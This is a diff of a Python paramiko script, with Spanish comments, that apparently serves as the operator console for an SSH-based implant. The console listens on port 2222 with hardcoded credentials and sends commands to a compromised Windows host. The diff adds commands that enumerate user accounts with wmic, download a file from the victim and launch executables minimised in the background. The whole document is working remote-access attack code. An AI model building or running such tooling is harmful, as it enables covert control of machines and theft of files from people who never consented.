@@ -1,7 +1,6 @@
 import paramiko
 import os
 import socket
-
 class SSHServer (paramiko.ServerInterface):
     def check_channel_request(self, kind, chanid):
         #metodo de conexion basico
@@ -14,8 +13,8 @@ class SSHServer (paramiko.ServerInterface):
         #aqui el usuario y pass que usaremos para el implant
         if (username == "sshuser") and (password == "sshpass"):
             #login correcto
-            return paramiko.AUTH_SUCCESFUL
-        return paramiko.AUTH_FAILED
+            return paramiko.AUTH_SUCCESSFUL
+        return paramiko.AUTH_FAILED        
 def main():
     server = "0.0.0.0" #para escuchar por cualquier interfaz
     port = 2222
@@ -41,7 +40,7 @@ def main():
     ssh_session.start_server(server=server)
     chan = ssh_session.accept()
     if chan is None:
-        print("Error de transporte o sesión")
+        print("Error de transporte o sesion")
         quit()
     print(chan) #para ver si que error saca
     success_msg = chan.recv(1024).decode()
@@ -52,21 +51,34 @@ def main():
             while True:
                 cmd_line = ("Shell%> ")
                 command = input(cmd_line + "")
+                #args = command.split()
                 if command == "get_users":
                     command = ("wmic useraccount list brief")
                     chan.send(command)
                     #respuesta
                     ret_value = chan.recv(8192)
                     print(ret_value.decode())
+                    continue
+                if command == "get_file":
+                    chan.send(command)
+                    filetodown = open("texto.txt", "wb")
+                    ret_value = chan.recv(8192)
+                    filetodown.write(ret_value)
+                    filetodown.close()
+                    print(ret_value.decode())
+                if command.split(" ")[0] == "exec":
+                    ejecutable = command.split(" ")[1]
+                    ejecucion = "start /MIN /B " + ejecutable
+                    chan.send(ejecucion)
+                    ret_value = chan.recv(8192)
+                    print(ret_value.decode())
                 if command == "":
-                    comm_handler()
+                    continue            
                 else:
-                    try:
                         chan.send(command)
                         ret_value = chan.recv(8192)
                         print(ret_value.decode())
-                    except SystemError:
-                        pass
+                        continue
         except Exception as e:
             print(str(e))
             pass
